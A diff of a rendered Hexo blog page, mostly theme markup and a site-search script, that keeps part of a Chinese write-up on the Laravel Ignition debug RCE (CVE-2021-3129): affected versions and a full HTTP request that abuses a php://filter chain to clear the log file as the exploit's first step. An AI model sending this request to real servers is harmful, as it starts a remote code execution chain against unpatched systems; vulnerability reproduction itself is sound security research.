@@ -1,13 +1,23 @@
 <!DOCTYPE html>
-<html lang="zh-CN">
+<html lang="en">
 
   <head>
   <meta charset="utf-8">
-  <meta name="author" content="zchengsite, 1451426471@qq.com" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="keywords" content="" />
+  <meta name="author" content="John Doe" />
+  <meta name="description" content="" />
   
   
-  <title>laravel＜=8.4.2 Debug RCE | N0puple</title>
+  <title>
+    
+      laravel＜=8.4.2 Debug RCE 
+      
+      
+      |
+    
+     N0puple
+  </title>
 
   
     <link rel="apple-touch-icon" href="/images/001.ico">
@@ -30,16 +40,13 @@
 
   <!-- fancybox -->
   <link href="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.css" rel="stylesheet">
-  <script src="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.js"></script>
+  <script async src="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.js"></script>
   
 <script src="/js/fancybox.js"></script>
 
 
   
 
-  
-
-  
 <meta name="generator" content="Hexo 5.4.0"></head>
 
 
@@ -47,7 +54,12 @@
     <div id="app">
       <div class="header">
   <div class="avatar">
-    <a href="/"><img src="/images/1.jpg" alt=""></a>
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="/images/1.jpg" alt="">
+      
+    </a>
     <div class="nickname"><a href="/">N0puple</a></div>
   </div>
   <div class="navbar">
@@ -59,10 +71,6 @@
       
         <li class="nav-item" data-path="/archives/">
           <a href="/archives/">归档</a>
-        </li>
-      
-        <li class="nav-item" data-path="/categories/">
-          <a href="/categories/">分类</a>
         </li>
       
         <li class="nav-item" data-path="/tags/">
@@ -81,55 +89,73 @@
   </div>
 </div>
 
+
 <script src="/js/activeNav.js"></script>
+
 
 
       <div class="flex-container">
         <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
 <!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
 
+<!-- LaTex Display -->
+<script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
+<script type="text/javascript" id="MathJax-script" async
+  src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js">
+</script>
+<script>
+MathJax = {
+  tex: {
+    inlineMath: [['$', '$'], ['\\(', '\\)']]
+  }
+};
+</script>
 
 
 
+  
 
+  
 
+  
 
-
-
-
-<!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
-<div class="container post-details" id="post-details">
-  <div class="post-content">
-    <div class="post-title">laravel＜=8.4.2 Debug RCE</div>
-    <div class="post-attach">
-      <span class="post-pubtime">2021-01-21</span>
-      <span class="post-tags">
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">laravel＜=8.4.2 Debug RCE</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime" title="Update time"></i>
+          2021-01-21 23:55:42
+        </span>
         
-          <i class="iconfont icon-tags"></i>
+              <span class="post-tags">
+                <i class="iconfont icon-tags" title="Tags"></i>
+                
+                <span class="span--tag">
+                  <a href="/tags/laravel/" title="laravel">
+                    <b>#</b> laravel
+                  </a>
+                </span>
+                
+                <span class="span--tag">
+                  <a href="/tags/php/" title="php">
+                    <b>#</b> php
+                  </a>
+                </span>
+                
+                <span class="span--tag">
+                  <a href="/tags/cve/" title="cve">
+                    <b>#</b> cve
+                  </a>
+                </span>
+                
+              </span>
           
-          <span class="span--tag">
-            <a href="/tags/laravel/">
-              #laravel
-            </a>
-          </span>
-          
-          <span class="span--tag">
-            <a href="/tags/php/">
-              #php
-            </a>
-          </span>
-          
-          <span class="span--tag">
-            <a href="/tags/cve/">
-              #cve
-            </a>
-          </span>
-          
-        
-      </span>
-    </div>
-    <div class="markdown-body">
-      <h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><p>laravel &lt;= 8.4.2<br>Ignition &lt;= 2.5.1<br>开启debug</p>
+      </div>
+      <div class="markdown-body">
+        <h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><p>laravel &lt;= 8.4.2<br>Ignition &lt;= 2.5.1<br>开启debug</p>
 <h2 id="CVE编号"><a href="#CVE编号" class="headerlink" title="CVE编号"></a>CVE编号</h2><p>CVE-2021-3129</p>
 <h2 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h2><h3 id="清空-log"><a href="#清空-log" class="headerlink" title="清空 log"></a>清空 log</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;_ignition&#x2F;execute-solution HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.136.167:8000</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko&#x2F;20100101 Firefox&#x2F;66.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http:&#x2F;&#x2F;192.168.136.167:8000&#x2F;_ignition&#x2F;execute-solution</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line">Content-Length: 320</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">	&quot;solution&quot;: &quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;,</span><br><span class="line">	&quot;parameters&quot;:&#123;</span><br><span class="line">		&quot;variableName&quot;: &quot;username&quot;,</span><br><span class="line">		&quot;viewFile&quot;: &quot;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode&#x2F;resource&#x3D;&#x2F;var&#x2F;www&#x2F;laravel&#x2F;storage&#x2F;logs&#x2F;laravel.log&quot;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
@@ -155,69 +181,77 @@
 <h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><p>exploit-db 提供了，我就不班门弄斧了，实际上 payload 暂时并不通用，随机应变把<br>我改了一下，是在生成 payload 后，在其前面加字符，一般加一个就能看出来行不行了。</p>
 <h2 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h2><p><img src="https://gitee.com/N0puple/nopic/raw/master/img/20210121235202109.png"></p>
 
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/2020/06/01/%E5%BB%BA%E7%AB%8B%E5%8D%9A%E5%AE%A2%E5%B0%8F%E8%AE%B0/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>Prev</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime" title="Update time"></i>
+              2021-01-21 23:55:42
+            </span>
+            
+                  <span class="post-tags">
+                    <i class="iconfont icon-tags" title="Tags"></i>
+                    
+                    <span class="span--tag">
+                      <a href="/tags/laravel/" title="laravel">
+                        <b>#</b> laravel
+                      </a>
+                    </span>
+                    
+                    <span class="span--tag">
+                      <a href="/tags/php/" title="php">
+                        <b>#</b> php
+                      </a>
+                    </span>
+                    
+                    <span class="span--tag">
+                      <a href="/tags/cve/" title="cve">
+                        <b>#</b> cve
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+          </div>
+          <div class="post-foot-prev">
+            
+              <a href="/2021/04/12/laravel5-7-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RCE%E5%A4%8D%E7%8E%B0/" target="_self">
+                <span>Next</span>
+                <i class="iconfont icon-chevronright"></i>
+              </a>
+            
+          </div>
+        </div>
+      
     </div>
     
-      <div class="prev-or-next">
-        <div class="post-foot-next">
-          
-            <a href="/2020/06/01/%E5%BB%BA%E7%AB%8B%E5%8D%9A%E5%AE%A2%E5%B0%8F%E8%AE%B0/" target="_self">
-              <i class="iconfont icon-chevronleft"></i>
-              <span>PREV</span>
-            </a>
-          
-        </div>
-        <div class="post-attach">
-          <span class="post-pubtime">2021-01-21</span>
-          <span class="post-tags">
-            
-              <i class="iconfont icon-tags"></i>
-              
-              <span class="span--tag">
-                <a href="/tags/laravel/">
-                  #laravel
-                </a>
-              </span>
-              
-              <span class="span--tag">
-                <a href="/tags/php/">
-                  #php
-                </a>
-              </span>
-              
-              <span class="span--tag">
-                <a href="/tags/cve/">
-                  #cve
-                </a>
-              </span>
-              
-            
-          </span>
-        </div>
-        <div class="post-foot-prev">
-          
-            <a href="/2021/04/12/laravel5-7-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RCE%E5%A4%8D%E7%8E%B0/" target="_self">
-              <span>NEXT</span>
-              <i class="iconfont icon-chevronright"></i>
-            </a>
-          
-        </div>
-      </div>
-    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
   </div>
-  
-  <div class="post-catalog" id="catalog">
-    <div class="title">目录</div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">Contents</div>
     <div class="catalog-content">
       <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D%E8%8C%83%E5%9B%B4"><span class="toc-text">影响范围</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE%E7%BC%96%E5%8F%B7"><span class="toc-text">CVE编号</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%8D%E7%8E%B0%E6%AD%A5%E9%AA%A4"><span class="toc-text">复现步骤</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B8%85%E7%A9%BA-log"><span class="toc-text">清空 log</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%9F%E6%88%90phar%E6%96%87%E4%BB%B6%E5%B9%B6base64"><span class="toc-text">生成phar文件并base64</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#quoted-printable-encode"><span class="toc-text">quoted-printable-encode</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%99%E5%85%A5log"><span class="toc-text">写入log</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B8%85%E7%A9%BA%E5%B9%B2%E6%89%B0%E5%AD%97%E7%AC%A6"><span class="toc-text">清空干扰字符</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-text">命令执行</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E6%9E%90"><span class="toc-text">解析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B8%85%E7%A9%BAlog"><span class="toc-text">清空log</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#quoted-printable-encode-1"><span class="toc-text">quoted-printable-encode</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#utf-16%E8%A7%A3%E7%A0%81"><span class="toc-text">utf-16解码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%89%E4%B8%A4%E4%B8%AA-payload"><span class="toc-text">有两个 payload</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#POC"><span class="toc-text">POC</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%88%E6%9E%9C"><span class="toc-text">效果</span></a></li></ol>
     </div>
   </div>
 
-  <script src="/js/catalog.js"></script>
-
-
-
   
-</div>
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+  </div>
 
 
         <div class="footer">
@@ -236,21 +270,19 @@
           </a>
         </li>
       
-        <li>
-          <a title="微信" href="">
-            <i class="iconfont icon-wechat"></i>
-          </a>
-        </li>
-      
     </ul>
   </div>
   
     <div class="footer-more">
-      <a target="_blank" rel="noopener" href="https://github.com/N0puple/">Copyright © N0puple 2020</a>
+      
+        <a target="_blank" rel="noopener" href="https://github.com/N0puple/">Copyright © N0puple 2020</a>
+        
     </div>
   
     <div class="footer-more">
-      <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Theme by Oranges | Powered by Hexo</a>
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Theme by Oranges | Powered by Hexo</a>
+        
     </div>
   
 </div>
@@ -263,7 +295,202 @@
   </a>
 </div>
 
+
 <script src="/js/backtotop.js"></script>
+
+
+
+      
+  <div class="search-icon" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="Search...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>First search, index file loading, please wait...<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>No result<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The search.xml file was not found, please refer to：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The request failed, Try to refresh the page or try again later.<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
 
 
     </div>
